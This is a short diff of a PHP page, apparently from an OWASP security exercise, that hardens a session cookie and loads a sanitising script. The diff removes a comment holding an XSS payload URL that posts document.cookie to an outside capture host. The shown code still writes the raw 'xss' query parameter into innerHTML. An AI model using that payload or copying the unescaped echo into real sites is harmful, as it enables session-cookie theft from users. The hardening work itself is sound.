@@ -1,18 +1,19 @@
 <?php 
     $sess_name = session_name();
     if (session_start()) {
-        setcookie($sess_name, session_id(), true, '/', null, null, false);
+        setcookie($sess_name, session_id(), null, '/', null, null, true);
     }
 ?>
-<!-- http://localhost:80/session/session_secure.php?xss=`%3Cimg%20src=vo%20onerror=%22fetch(%27https://security.free.beeceptor.com/%27,%20{%20method:%20%27POST%27,%20body:%20document.cookie})%22%20%3E` -->
+
 <!DOCTYPE html>
 <html>
     <head>
         <title>Owasp</title>
+    <script type="text/javascript" src="./purify.js"></script>
     </head>
     <body>
         <div id="test">
-    </div>
+        </div>
     </body>
     <script>
         window.document.getElementById('test').innerHTML = <?php echo $_GET['xss'] ?>
